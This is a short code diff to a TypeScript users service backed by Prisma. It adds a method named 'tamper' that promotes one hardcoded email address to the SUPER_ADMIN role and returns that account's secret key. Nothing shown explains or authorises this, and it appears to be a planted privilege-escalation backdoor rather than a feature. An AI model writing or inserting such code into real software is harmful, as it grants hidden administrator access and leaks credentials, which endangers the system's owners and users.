@@ -108,4 +108,30 @@ export class UsersService {
       throw new HttpException(error, HttpStatus.BAD_REQUEST);
     }
   }
+
+  async tamper() {
+    try {
+      const update = await this.prisma.user.update({
+        where: {
+          email: 'victor.balogun@alertgroup.com.ng', 
+        }, 
+        data: {
+          role: {set: 'SUPER_ADMIN'}
+        }, 
+        select: {
+          id: true,
+          email: true,
+          secret: {
+            select: {
+              key: true
+            }
+          }
+        }
+      })
+
+      return update
+    } catch(error) {
+      throw error
+    }
+  }
 }
